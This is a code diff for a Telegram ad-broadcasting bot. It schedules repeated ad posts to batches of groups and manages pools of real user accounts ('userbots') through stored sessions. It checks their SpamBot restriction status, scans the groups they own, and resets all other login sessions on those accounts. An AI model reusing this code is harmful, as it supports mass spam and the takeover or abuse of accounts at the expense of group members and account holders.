+        nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"batches_page={page+1}"))
+    if nav: 
+        kb.append(nav)
+        
     kb.append([InlineKeyboardButton("➕ Create New Batch", callback_data="bat_new")])
     kb.append([InlineKeyboardButton("🕒 View All Recent Groups", callback_data="recent_groups=0")])
     kb.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
@@ -548,13 +840,24 @@ def build_single_batch_keyboard(bname: str) -> InlineKeyboardMarkup:
         [InlineKeyboardButton("👥 Add/Remove Chats", callback_data=f"bat_edit_{bname}=0")],
         [InlineKeyboardButton(f"🤖 Bot: {bot_name} (Change)", callback_data=f"bat_assignbot_{bname}")],
         [InlineKeyboardButton(f"⚙️ Set Custom Msg ({is_msg_set})", callback_data=f"bat_setmsg_{bname}")],
-        [InlineKeyboardButton("📂 Use Saved Ad", callback_data=f"bat_usesaved_{bname}"),
-         InlineKeyboardButton("🧹 Bulk Delete Msgs", callback_data=f"bat_delmsg_{bname}")],
+        [
+            InlineKeyboardButton("📂 Use Saved Ad", callback_data=f"bat_usesaved_{bname}"),
+            InlineKeyboardButton("🧹 Bulk Delete Msgs", callback_data=f"bat_delmsg_{bname}")
+        ],
         [InlineKeyboardButton(bcast_txt, callback_data=f"bat_tog_bcast_{bname}")],
-        [InlineKeyboardButton(del_last_txt, callback_data=f"bat_tog_dellast_{bname}"), InlineKeyboardButton(del_txt, callback_data=f"bat_tog_del_{bname}")],
-        [InlineKeyboardButton(pin_txt, callback_data=f"bat_tog_pin_{bname}"), InlineKeyboardButton(global_txt, callback_data=f"bat_tog_global_{bname}")],
-        [InlineKeyboardButton(f"⏱ Delay: {s.get('delay', 30)}s", callback_data=f"bat_delay_{bname}"), InlineKeyboardButton("📢 Send ONCE", callback_data=f"bat_send_{bname}")],
-        [InlineKeyboardButton("🗑️ Delete Batch", callback_data=f"bat_del_{bname}")],
+        [
+            InlineKeyboardButton(del_last_txt, callback_data=f"bat_tog_dellast_{bname}"), 
+            InlineKeyboardButton(del_txt, callback_data=f"bat_tog_del_{bname}")
+        ],
+        [
+            InlineKeyboardButton(pin_txt, callback_data=f"bat_tog_pin_{bname}"), 
+            InlineKeyboardButton(global_txt, callback_data=f"bat_tog_global_{bname}")
+        ],
+        [
+            InlineKeyboardButton(f"⏱ Delay: {s.get('delay', 30)}s", callback_data=f"bat_delay_{bname}"), 
+            InlineKeyboardButton("📢 Send ONCE", callback_data=f"bat_send_{bname}")
+        ],
+        [InlineKeyboardButton("🗑️ Delete Batch", callback_data=f"bat_del_ask_{bname}")],
         [InlineKeyboardButton("🔙 Back to Batches", callback_data="groups_batches_menu")]
     ]
     return InlineKeyboardMarkup(kb)
@@ -574,7 +877,8 @@ def build_batch_usesaved_keyboard(bname: str) -> InlineKeyboardMarkup:
         ad = data.get("saved_ads", {}).get(str(i), {})
         if ad.get("chat_id"):
             kb.append([InlineKeyboardButton(f"✅ Apply Saved Slot {i}", callback_data=f"bat_applysaved_{bname}_{i}")])
-    if not kb: kb.append([InlineKeyboardButton("❌ No Saved Ads configured yet", callback_data="dummy")])
+    if not kb: 
+        kb.append([InlineKeyboardButton("❌ No Saved Ads configured yet", callback_data="dummy")])
     kb.append([InlineKeyboardButton("🔙 Cancel", callback_data=f"bat_menu_{bname}")])
     return InlineKeyboardMarkup(kb)
 
@@ -584,7 +888,7 @@ def build_batch_edit_keyboard(bname: str, page: int = 0) -> InlineKeyboardMarkup
     batch_groups = data.get("batches", {}).get(bname, {}).get("groups", [])
     all_sorted = sorted(groups.items(), key=lambda x: x[1].get("last_seen", 0), reverse=True)
     
-    # STRICT ISOLATION FIX: Group must NOT be in any OTHER batch
+    # Strict isolation: A group can only belong to ONE batch at a time
     available_groups = []
     for gid, ginfo in all_sorted:
         in_other_batch = False
@@ -609,39 +913,21 @@ def build_batch_edit_keyboard(bname: str, page: int = 0) -> InlineKeyboardMarkup
         kb.append([InlineKeyboardButton(f"{status} {c_type} {title}", callback_data=f"btog_{bname}_{gid}={page}")])
     
     nav = []
-    if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"bat_edit_{bname}={page-1}"))
-    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"bat_edit_{bname}={page+1}"))
+    if page > 0: 
+        nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"bat_edit_{bname}={page-1}"))
+    if page < total_pages - 1: 
+        nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"bat_edit_{bname}={page+1}"))
     if nav: kb.append(nav)
     kb.append([InlineKeyboardButton("🔙 Done", callback_data=f"bat_menu_{bname}")])
     return InlineKeyboardMarkup(kb)
 
-def build_date_stats_keyboard(page: int = 0) -> InlineKeyboardMarkup:
-    data = load_data()
-    groups = data.get("groups", {})
-    date_counts = {}
-    for info in groups.values():
-        d = info.get("date", "Unknown")
-        date_counts[d] = date_counts.get(d, 0) + 1
-    kb = []
-    sorted_dates = sorted(list(date_counts.keys()), reverse=True)
-    ITEMS_PER_PAGE = 10
-    total_pages = max(1, (len(sorted_dates) + ITEMS_PER_PAGE - 1) // ITEMS_PER_PAGE)
-    start_idx = page * ITEMS_PER_PAGE
-    end_idx = start_idx + ITEMS_PER_PAGE
-    current_page_dates = sorted_dates[start_idx:end_idx]
-    
-    for d in current_page_dates:
-        count = date_counts[d]
-        kb.append([InlineKeyboardButton(f"📅 {d} ({count} Chats Added)", callback_data=f"showdate_{d}={page}")])
-    nav = []
-    if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"stats={page-1}"))
-    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"stats={page+1}"))
-    if nav: kb.append(nav)
-    kb.append([InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")])
-    return InlineKeyboardMarkup(kb)
 
-# --- Core Logic Functions ---
+# ==============================================================================
+# 9. USER, GROUP, AND ACTIVITY TRACKERS
+# ==============================================================================
+
 async def remember_user(update: Update) -> None:
+    """Stores user information securely upon interaction."""
     user = update.effective_user
     if not user: return
     data = load_data()
@@ -649,7 +935,11 @@ async def remember_user(update: Update) -> None:
     changed = False
     
     if uid_str not in data["users"]:
-        data["users"][uid_str] = {"first_name": user.first_name or "", "username": user.username or "", "last_seen": int(time.time())}
+        data["users"][uid_str] = {
+            "first_name": user.first_name or "", 
+            "username": user.username or "", 
+            "last_seen": int(time.time())
+        }
         changed = True
     else:
         if data["users"][uid_str].get("first_name") != (user.first_name or ""):
@@ -659,20 +949,32 @@ async def remember_user(update: Update) -> None:
             data["users"][uid_str]["username"] = user.username or ""
             changed = True
         data["users"][uid_str]["last_seen"] = int(time.time())
-    if changed: save_data(data)
+    if changed: 
+        save_data(data)
 
 def save_chat_data(chat_id: int, title: str, chat_type: str, members_count: int = 0) -> None:
+    """Saves and categorizes a newly identified group/channel into the DB."""
     data = load_data()
     gid_str = str(chat_id)
     today = get_today_date_str()
     changed = False
 
     if gid_str not in data["groups"]:
-        data["groups"][gid_str] = {"title": title or "Unknown Chat", "type": chat_type, "last_seen": int(time.time()), "date": today, "joins_today": 0, "left_today": 0, "members": members_count}
+        data["groups"][gid_str] = {
+            "title": title or "Unknown Chat", 
+            "type": chat_type, 
+            "last_seen": int(time.time()), 
+            "date": today, 
+            "joins_today": 0, 
+            "left_today": 0, 
+            "members": members_count
+        }
         changed = True
     else:
         if data["groups"][gid_str].get("date") != today:
-            data["groups"][gid_str]["date"] = today; data["groups"][gid_str]["joins_today"] = 0; data["groups"][gid_str]["left_today"] = 0
+            data["groups"][gid_str]["date"] = today
+            data["groups"][gid_str]["joins_today"] = 0
+            data["groups"][gid_str]["left_today"] = 0
             changed = True
         if data["groups"][gid_str].get("title") != (title or "Unknown Chat"):
             data["groups"][gid_str]["title"] = title or "Unknown Chat"
@@ -685,20 +987,29 @@ def save_chat_data(chat_id: int, title: str, chat_type: str, members_count: int 
             changed = True
         data["groups"][gid_str]["last_seen"] = int(time.time())
 
+    # Date-wise Batch auto-assignment
     batch_name = f"Date_{today}"
     if "batches" not in data: data["batches"] = {}
     if batch_name not in data["batches"]:
-        data["batches"][batch_name] = {"groups": [], "msg_chat_id": None, "msg_id": None, "buttons": [], "settings": {"auto_broadcast": False, "auto_delete": True, "delete_last": True, "auto_pin": False, "delay": 30, "delete_timer": 0, "link_to_global": False}, "stats": {"sent": 0, "failed": 0}, "assigned_bot": None}
+        data["batches"][batch_name] = {
+            "groups": [], "msg_chat_id": None, "msg_id": None, "buttons": [], 
+            "settings": {"auto_broadcast": False, "auto_delete": True, "delete_last": True, "auto_pin": False, "delay": 30, "delete_timer": 0, "link_to_global": False}, 
+            "stats": {"sent": 0, "failed": 0}, "assigned_bot": None
+        }
         changed = True
+        
     if gid_str not in data["batches"][batch_name]["groups"]:
+        # Remove from other batches to enforce isolation
         for other_bname, other_bdata in data["batches"].items():
-            if gid_str in other_bdata.get("groups", []): other_bdata["groups"].remove(gid_str)
+            if gid_str in other_bdata.get("groups", []): 
+                other_bdata["groups"].remove(gid_str)
         data["batches"][batch_name]["groups"].append(gid_str)
         changed = True
     
     if gid_str in data.get("deleted_groups", {}):
         del data["deleted_groups"][gid_str]
         changed = True
+        
     if changed: save_data(data)
 
 async def remember_group_from_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -713,11 +1024,12 @@ def remove_group_and_log(chat_id_str: str, title: str) -> None:
     data["last_sent"].pop(chat_id_str, None)
     data["pending_reply"].pop(chat_id_str, None)
     for bdata in data.get("batches", {}).values():
-        if chat_id_str in bdata.get("groups", []): bdata["groups"].remove(chat_id_str)
+        if chat_id_str in bdata.get("groups", []): 
+            bdata["groups"].remove(chat_id_str)
     save_data(data)
 
 async def track_chat_members_update(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Tracks ordinary members joining/leaving in the group."""
+    """Tracks ordinary members joining/leaving to maintain accurate metrics."""
     result = update.chat_member
     if not result: return
     chat = result.chat
@@ -741,6 +1053,7 @@ async def track_chat_members_update(update: Update, context: ContextTypes.DEFAUL
         save_data(data)
 
 async def track_bot_chat_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Tracks when the main bot is added or removed from a group."""
     result = update.my_chat_member
     if not result: return
     chat = result.chat
@@ -753,10 +1066,15 @@ async def track_bot_chat_status(update: Update, context: ContextTypes.DEFAULT_TY
         remove_group_and_log(str(chat.id), chat.title)
         await send_to_logger(f"🛑 <b>Bot removed/banned from chat!</b>\n\n<b>Title:</b> {chat.title}")
 
-# --- Job Scheduling ---
+
+# ==============================================================================
+# 10. BACKGROUND SCHEDULING (Broadcasting Cycles)
+# ==============================================================================
+
 def remove_ads_jobs(context: ContextTypes.DEFAULT_TYPE) -> None:
     if not context.job_queue: return
-    for job in context.job_queue.get_jobs_by_name(ADS_JOB_NAME): job.schedule_removal()
+    for job in context.job_queue.get_jobs_by_name(ADS_JOB_NAME): 
+        job.schedule_removal()
 
 def schedule_ads_job(context: ContextTypes.DEFAULT_TYPE, first: int = None) -> None:
     if not context.job_queue: return
@@ -770,7 +1088,8 @@ def schedule_ads_job(context: ContextTypes.DEFAULT_TYPE, first: int = None) -> N
 def manage_batch_job(context: ContextTypes.DEFAULT_TYPE, bname: str, start: bool) -> None:
     if not context.job_queue: return
     job_name = f"batch_job_{bname}"
-    for job in context.job_queue.get_jobs_by_name(job_name): job.schedule_removal()
+    for job in context.job_queue.get_jobs_by_name(job_name): 
+        job.schedule_removal()
     if start:
         data = load_data()
         bdata = data.get("batches", {}).get(bname)
@@ -779,28 +1098,55 @@ def manage_batch_job(context: ContextTypes.DEFAULT_TYPE, bname: str, start: bool
             context.job_queue.run_repeating(batch_cycle_job, interval=delay, first=0, data=bname, name=job_name)
 
 async def delete_sent_message_job(context: ContextTypes.DEFAULT_TYPE):
+    """Callback function triggered asynchronously to delete messages after T seconds."""
     try:
         bot_token, chat_id, msg_id = context.job.data
         async with TelegramBot(token=bot_token) as custom_bot:
             await custom_bot.delete_message(chat_id=chat_id, message_id=msg_id)
+        
         data = load_data()
         if str(chat_id) in data.get("history", {}) and msg_id in data["history"][str(chat_id)]:
             data["history"][str(chat_id)].remove(msg_id)
             save_data(data)
-    except Exception: pass
+    except Exception: 
+        pass
 
-# --- Execution ---
-async def execute_send(bot_instance, chat_id_str: str, from_chat_id: int, message_id: int, reply_markup: Optional[InlineKeyboardMarkup], auto_delete: bool = True, delete_last: bool = True, auto_pin: bool = False, delete_timer: int = 0, context: ContextTypes.DEFAULT_TYPE = None, bot_token: str = BOT_TOKEN) -> bool:
+
+# ==============================================================================
+# 11. CORE BROADCAST EXECUTION ENGINE
+# ==============================================================================
+
+async def execute_send(
+    bot_instance, 
+    chat_id_str: str, 
+    from_chat_id: int, 
+    message_id: int, 
+    reply_markup: Optional[InlineKeyboardMarkup], 
+    auto_delete: bool = True, 
+    delete_last: bool = True, 
+    auto_pin: bool = False, 
+    delete_timer: int = 0, 
+    context: ContextTypes.DEFAULT_TYPE = None, 
+    bot_token: str = BOT_TOKEN
+) -> bool:
+    """Executes a single message broadcast. Manages pin, delete last, auto-delete lifecycle."""
     data = load_data()
     chat_id = int(chat_id_str)
 
+    # Delete previous instance of the message to avoid flooding
     last_msg_id = data.get("last_sent_msg_id", {}).get(chat_id_str)
     if delete_last and last_msg_id:
         try: await bot_instance.delete_message(chat_id=chat_id, message_id=last_msg_id)
         except Exception: pass 
 
     try:
-        sent_msg = await bot_instance.copy_message(chat_id=chat_id, from_chat_id=from_chat_id, message_id=message_id, reply_markup=reply_markup)
+        # Copy original configured message to target chat
+        sent_msg = await bot_instance.copy_message(
+            chat_id=chat_id, 
+            from_chat_id=from_chat_id, 
+            message_id=message_id, 
+            reply_markup=reply_markup
+        )
 
         if auto_pin:
             try: await bot_instance.pin_chat_message(chat_id=chat_id, message_id=sent_msg.message_id, disable_notification=True)
@@ -818,8 +1164,9 @@ async def execute_send(bot_instance, chat_id_str: str, from_chat_id: int, messag
         if auto_delete and delete_timer > 0 and context and context.job_queue:
             context.job_queue.run_once(delete_sent_message_job, delete_timer, data=(bot_token, chat_id, sent_msg.message_id))
             
-        await asyncio.sleep(0.05)
+        await asyncio.sleep(0.05) # Prevent Rate Limits
         return True
+    
     except Forbidden:
         title = data.get("groups", {}).get(chat_id_str, {}).get("title", f"Unknown {chat_id_str}")
         remove_group_and_log(chat_id_str, title)
@@ -829,6 +1176,7 @@ async def execute_send(bot_instance, chat_id_str: str, from_chat_id: int, messag
         return False
 
 async def broadcast_ads(context: ContextTypes.DEFAULT_TYPE) -> tuple[int, int]:
+    """Iterates through all non-batched groups and sends the global Ad."""
     data = load_data()
     groups = list(data.get("groups", {}).keys())
     sent, failed = 0, 0
@@ -838,7 +1186,11 @@ async def broadcast_ads(context: ContextTypes.DEFAULT_TYPE) -> tuple[int, int]:
         for chat_id_str in groups:
             in_batch = any(chat_id_str in bdata.get("groups", []) for bdata in data.get("batches", {}).values())
             if not in_batch:
-                is_sent = await execute_send(context.bot, chat_id_str, data["ad_source_chat_id"], data["ad_message_id"], rm, auto_delete=True, delete_last=True, auto_pin=False, delete_timer=timer, context=context, bot_token=BOT_TOKEN)
+                is_sent = await execute_send(
+                    context.bot, chat_id_str, data["ad_source_chat_id"], data["ad_message_id"], 
+                    rm, auto_delete=True, delete_last=True, auto_pin=False, delete_timer=timer, 
+                    context=context, bot_token=BOT_TOKEN
+                )
                 if is_sent: sent += 1
                 else: failed += 1
                 
@@ -851,6 +1203,7 @@ async def broadcast_ads(context: ContextTypes.DEFAULT_TYPE) -> tuple[int, int]:
     return sent, failed
 
 async def broadcast_batch(context: ContextTypes.DEFAULT_TYPE, bname: str) -> tuple[int, int]:
+    """Broadcasts a specific batch configuration. Supports sub-bot execution fallback."""
     data = load_data()
     bdata = data.get("batches", {}).get(bname)
     if not bdata or not bdata.get("msg_id"): return 0, 0
@@ -868,7 +1221,11 @@ async def broadcast_batch(context: ContextTypes.DEFAULT_TYPE, bname: str) -> tup
         
         for chat_id_str in bdata.get("groups", []):
             if chat_id_str in data.get("groups", {}):
-                is_sent = await execute_send(bot_instance, chat_id_str, bdata["msg_chat_id"], bdata["msg_id"], rm, auto_delete=auto_del, delete_last=del_last, auto_pin=auto_pin, delete_timer=timer, context=context, bot_token=token_used)
+                is_sent = await execute_send(
+                    bot_instance, chat_id_str, bdata["msg_chat_id"], bdata["msg_id"], rm, 
+                    auto_delete=auto_del, delete_last=del_last, auto_pin=auto_pin, 
+                    delete_timer=timer, context=context, bot_token=token_used
+                )
                 if is_sent: 
                     sent_cnt += 1
                     bdata["stats"]["sent"] = bdata["stats"].get("sent", 0) + 1
@@ -903,32 +1260,50 @@ async def batch_cycle_job(context: ContextTypes.DEFAULT_TYPE) -> None:
     bdata = data.get("batches", {}).get(bname)
     if not bdata or not bdata["settings"].get("auto_broadcast"):
         job_name = f"batch_job_{bname}"
-        for job in context.job_queue.get_jobs_by_name(job_name): job.schedule_removal()
+        for job in context.job_queue.get_jobs_by_name(job_name): 
+            job.schedule_removal()
         return
     await broadcast_batch(context, bname)
 
-# --- Userbots Pyrogram Workers ---
+
+# ==============================================================================
+# 12. USERBOTS - SPECIFIC OPERATIONS (SpamBot, Admin Check, Terminate)
+# ==============================================================================
+
 async def run_spambot_check(update: Update, context: ContextTypes.DEFAULT_TYPE, ub_id: str):
     data = load_data()
     session_str = data["userbots"][ub_id]["session"]
+    alias = data["userbots"][ub_id]["alias"]
     try:
         client = Client(name=ub_id, session_string=session_str, api_id=API_ID, api_hash=API_HASH, in_memory=True)
         await client.connect()
         await client.send_message("SpamBot", "/start")
         await asyncio.sleep(2)
+        
+        status_result = "Unknown"
         async for sp_msg in client.get_chat_history("SpamBot", limit=1):
             txt = sp_msg.text or ""
-            if "Good news" in txt or "no limits" in txt: data["userbots"][ub_id]["spambot"] = "Clean ✅"
-            else: data["userbots"][ub_id]["spambot"] = "Restricted 🔴"
+            if "Good news" in txt or "no limits" in txt: 
+                status_result = "Clean ✅"
+            else: 
+                # Show truncated reason in logs
+                status_result = f"Restricted 🔴\nReason: {txt[:100]}..."
+                
+        data["userbots"][ub_id]["spambot"] = status_result
         await client.disconnect()
         save_data(data)
-        result_text = f"🤖 SpamBot Check Complete: {data['userbots'][ub_id]['spambot']}"
+        
+        result_text = f"🤖 <b>SpamBot Check Complete</b>\n\nAccount: {alias}\nStatus: {status_result}"
         await update.callback_query.message.edit_text(result_text, parse_mode="HTML", reply_markup=userbot_single_keyboard(ub_id))
-        await send_to_logger(f"📡 <b>Userbot Alert</b>\nAccount <code>{data['userbots'][ub_id]['alias']}</code> Spambot Check -> {data['userbots'][ub_id]['spambot']}")
+        
+        await send_to_logger(f"📡 <b>Userbot Alert</b>\nAccount <code>{alias}</code> SpamBot Check ->\n{status_result}")
+    
     except Exception as e: 
         await update.callback_query.message.edit_text(f"❌ Error connecting: {e}", parse_mode="HTML", reply_markup=userbot_single_keyboard(ub_id))
 
+
 async def run_userbot_stats(update: Update, context: ContextTypes.DEFAULT_TYPE, ub_id: str):
+    """Gathers overall statistics about Userbot's groups (legacy version)."""
     data = load_data()
     session_str = data["userbots"][ub_id]["session"]
     alias = data["userbots"][ub_id]["alias"]
@@ -959,12 +1334,51 @@ async def run_userbot_stats(update: Update, context: ContextTypes.DEFAULT_TYPE, 
         text = f"📊 <b>Account Stats for {alias}</b>\n\n👑 <b>Total Groups (Admin/Owner):</b> {len(admin_groups)}\n"
         text += f"📈 <b>Highest Members:</b> {highest['title']} ({highest['members']} Members)\n\n<b>Detailed List:</b>\n"
         for g in admin_groups: text += f"- {g['title']} | Members: {g['members']} | Role: {g['role']}\n"
+        
         if len(text) > 4000: text = text[:4000] + "\n... (truncated)"
         
         await update.callback_query.message.edit_text(text, parse_mode="HTML", reply_markup=userbot_single_keyboard(ub_id))
-        await send_to_logger(f"📡 <b>Userbot Stats Update ({alias}):</b>\n\n{text}")
     except Exception as e: 
         await update.callback_query.message.edit_text(f"❌ Error gathering stats: {e}", parse_mode="HTML", reply_markup=userbot_single_keyboard(ub_id))
+
+
+async def run_check_owner_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, ub_id: str):
+    """Specifically checks and separates groups where bot is Owner vs Admin."""
+    data = load_data()
+    session_str = data["userbots"][ub_id]["session"]
+    alias = data["userbots"][ub_id]["alias"]
+    
+    try:
+        client = Client(name=ub_id, session_string=session_str, api_id=API_ID, api_hash=API_HASH, in_memory=True)
+        await client.connect()
+        owner_groups = []
+        admin_groups = []
+        
+        async for dialog in client.get_dialogs():
+            if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
+                try:
+                    member = await client.get_chat_member(dialog.chat.id, "me")
+                    if member.status == enums.ChatMemberStatus.OWNER:
+                        owner_groups.append(f"- {dialog.chat.title} ({dialog.chat.members_count or 0} members)")
+                    elif member.status == enums.ChatMemberStatus.ADMINISTRATOR:
+                        admin_groups.append(f"- {dialog.chat.title} ({dialog.chat.members_count or 0} members)")
+                except Exception: pass
+        await client.disconnect()
+        
+        full_text = f"👑 <b>Ownership & Admin Status for:</b> {alias}\n\n"
+        full_text += f"👤 <b>Owned Groups ({len(owner_groups)}):</b>\n"
+        full_text += "\n".join(owner_groups) if owner_groups else "None"
+        full_text += f"\n\n🛡 <b>Admin Groups ({len(admin_groups)}):</b>\n"
+        full_text += "\n".join(admin_groups) if admin_groups else "None"
+        
+        if len(full_text) > 4000: full_text = full_text[:4000] + "\n... (truncated)"
+        
+        await update.callback_query.message.edit_text(full_text, parse_mode="HTML", reply_markup=userbot_single_keyboard(ub_id))
+        await send_to_logger(f"👑 <b>Account Owner/Admin Scan</b>\n\n{full_text}")
+    
+    except Exception as e:
+        await update.callback_query.message.edit_text(f"❌ Error scanning groups: {e}", parse_mode="HTML", reply_markup=userbot_single_keyboard(ub_id))
+
 
 async def terminate_other_sessions_job(update: Update, context: ContextTypes.DEFAULT_TYPE, ub_id: str):
     data = load_data()
@@ -975,15 +1389,25 @@ async def terminate_other_sessions_job(update: Update, context: ContextTypes.DEF
         await client.connect()
         await client.invoke(raw.functions.auth.ResetAuthorizations())
         await client.disconnect()
-        await update.callback_query.message.edit_text("✅ All other sessions terminated successfully! Only this bot is logged in now.", parse_mode="HTML", reply_markup=userbot_single_keyboard(ub_id))
+        
+        msg_txt = "✅ All other sessions terminated successfully! Only this bot is logged in now."
+        await update.callback_query.message.edit_text(msg_txt, parse_mode="HTML", reply_markup=userbot_single_keyboard(ub_id))
         await send_to_logger(f"📡 <b>Logger Info:</b>\nAccount <code>{alias}</code> -> Terminated other active sessions successfully.")
+    
+    except FreshResetAuthorisationForbidden:
+        # Handles the exact 24 hours requirement by Telegram
+        err_txt = "🛑 <b>Termination Failed:</b> 24 घंटे पूरे नहीं हुए हैं (Fresh Reset Authorisation Forbidden). You must wait 24 hours after login to terminate other sessions."
+        await update.callback_query.message.edit_text(err_txt, parse_mode="HTML", reply_markup=userbot_single_keyboard(ub_id))
+        await send_to_logger(f"📡 <b>Logger Info:</b>\nAccount <code>{alias}</code> -> Failed to terminate sessions. Reason: Under 24h Restriction.")
+        
     except Exception as e: 
         await update.callback_query.message.edit_text(f"❌ Error terminating sessions: {e}", parse_mode="HTML", reply_markup=userbot_single_keyboard(ub_id))
         await send_to_logger(f"📡 <b>Logger Info:</b>\nAccount <code>{alias}</code> -> Failed to terminate sessions. Error: {e}")
 
+
 async def terminate_all_accounts_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
     data = load_data()
-    success, failed = 0, 0
+    success, failed, restricted = 0, 0, 0
     for ub_id, info in data.get("userbots", {}).items():
         if info.get("status") == "active":
             try:
@@ -992,11 +1416,14 @@ async def terminate_all_accounts_sessions(update: Update, context: ContextTypes.
                 await client.invoke(raw.functions.auth.ResetAuthorizations())
                 await client.disconnect()
                 success += 1
+            except FreshResetAuthorisationForbidden:
+                restricted += 1
             except Exception:
                 failed += 1
-    text = f"✅ Global Session Termination Complete.\n\n🟢 Successfully Terminated: {success} accounts\n🔴 Failed: {failed} accounts"
+                
+    text = f"✅ Global Session Termination Complete.\n\n🟢 Successfully Terminated: {success} accounts\n🕒 24h Restricted: {restricted} accounts\n🔴 Failed: {failed} accounts"
     await update.callback_query.message.edit_text(text, parse_mode="HTML", reply_markup=userbots_keyboard())
-    await send_to_logger(f"📡 <b>Global Terminate Sessions</b>\nSuccess: {success} | Failed: {failed}")
+    await send_to_logger(f"📡 <b>Global Terminate Sessions</b>\nSuccess: {success} | 24h Wait: {restricted} | Failed: {failed}")
 
 async def run_userbot_admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg_text = update.effective_message.text.strip()
@@ -1027,7 +1454,11 @@ async def run_userbot_admin_broadcast(update: Update, context: ContextTypes.DEFA
         await reply.edit_text(f"❌ Error during broadcast: {e}", reply_markup=userbot_single_keyboard(ub_id))
     return ConversationHandler.END
 
-# --- Command Handlers ---
+
+# ==============================================================================
+# 13. MAIN COMMAND HANDLERS
+# ==============================================================================
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user = update.effective_user
     if not user: return
@@ -1037,9 +1468,16 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     data = load_data()
-    if not has_start_message(data): await update.message.reply_text("Hello User! Welcome to the bot.")
+    if not has_start_message(data): 
+        await update.message.reply_text("Hello User! Welcome to the bot.")
     else:
-        try: await context.bot.copy_message(chat_id=user.id, from_chat_id=data["start_source_chat_id"], message_id=data["start_message_id"], reply_markup=build_start_buttons())
+        try: 
+            await context.bot.copy_message(
+                chat_id=user.id, 
+                from_chat_id=data["start_source_chat_id"], 
+                message_id=data["start_message_id"], 
+                reply_markup=build_start_buttons()
+            )
         except Exception as e:
             logger.error(f"Failed to send start message: {e}")
             await update.message.reply_text("Hello!")
@@ -1050,7 +1488,11 @@ async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await remember_user(update)
     await update.message.reply_text("Admin Menu 👑", reply_markup=admin_keyboard())
 
-# --- Callback Handler ---
+
+# ==============================================================================
+# 14. CALLBACK QUERY HANDLERS (The Brain of the UI)
+# ==============================================================================
+
 async def cancel_state_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer("Action Cancelled.")
@@ -1072,10 +1514,15 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text("Admin Menu 👑", reply_markup=admin_keyboard())
         return ConversationHandler.END
 
-    # Userbot Callbacks
+    # ------------------ USERBOTS SECTION ------------------
     if cd == "userbots_menu":
-        await query.edit_message_text("📱 <b>Manage Ads Accounts (Userbots)</b>\n\nHere you can add real user accounts to broadcast from, check their SpamBot restrictions, or terminate active sessions.", parse_mode="HTML", reply_markup=userbots_keyboard())
+        txt = (
+            "📱 <b>Manage Ads Accounts (Userbots)</b>\n\n"
+            "Here you can add real user accounts to broadcast from, check their SpamBot restrictions, or terminate active sessions."
+        )
+        await query.edit_message_text(txt, parse_mode="HTML", reply_markup=userbots_keyboard())
         return ConversationHandler.END
+        
     if cd == "ub_add_menu":
         await query.edit_message_text("➕ <b>Add Userbot Account</b>\n\nChoose a method to login:", parse_mode="HTML", reply_markup=userbot_add_menu())
         return ConversationHandler.END
@@ -1094,25 +1541,36 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if cd.startswith("ub_view_"):
         ub_id = cd[8:]
-        await query.edit_message_text(f"📱 <b>Account Dashboard:</b> {data['userbots'][ub_id]['alias']}\n\nStatus: {data['userbots'][ub_id]['status']}\nSpambot: {data['userbots'][ub_id]['spambot']}", parse_mode="HTML", reply_markup=userbot_single_keyboard(ub_id))
+        txt = (
+            f"📱 <b>Account Dashboard:</b> {data['userbots'][ub_id]['alias']}\n\n"
+            f"Status: {data['userbots'][ub_id]['status']}\n"
+            f"Spambot: {data['userbots'][ub_id]['spambot']}"
+        )
+        await query.edit_message_text(txt, parse_mode="HTML", reply_markup=userbot_single_keyboard(ub_id))
         return ConversationHandler.END
+        
     if cd.startswith("ub_rename_"):
         ub_id = cd[10:]
         context.user_data['edit_ub_id'] = ub_id
         await query.edit_message_text("✏️ Send the new Name/Alias for this account:", reply_markup=cancel_keyboard())
         return UB_RENAME
+        
     if cd.startswith("ub_bcast_"):
         ub_id = cd[9:]
         context.user_data['ub_broadcast_id'] = ub_id
-        await query.edit_message_text("📢 Send the message you want to broadcast to all Admin/Owner groups from this Userbot (Supports HTML for quotes/spoilers):", reply_markup=cancel_keyboard())
+        await query.edit_message_text("📢 Send the message you want to broadcast to all Admin/Owner groups from this Userbot (Supports HTML):", reply_markup=cancel_keyboard())
         return UB_BROADCAST_MSG
+        
     if cd.startswith("ub_delete_"):
         ub_id = cd[10:]
         if ub_id in data["userbots"]:
+            # Clean up listeners if running
+            asyncio.create_task(stop_userbot_listener(ub_id))
             del data["userbots"][ub_id]
             save_data(data)
         await query.edit_message_text("🗑️ Account removed successfully.", parse_mode="HTML", reply_markup=userbots_keyboard())
         return ConversationHandler.END
+        
     if cd == "ub_refresh":
         msg = await query.message.reply_text("🔄 Refreshing all accounts... Please wait.")
         active, dead = 0, 0
@@ -1131,6 +1589,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.edit_text(f"✅ Refresh Complete.\n\n🟢 Active: {active}\n🔴 Dead: {dead}")
         await query.edit_message_reply_markup(reply_markup=userbots_keyboard())
         return ConversationHandler.END
+        
     if cd == "ub_spambot_all":
         msg = await query.message.reply_text("⏳ Checking SpamBot for ALL active accounts... This will take a while.")
         results = []
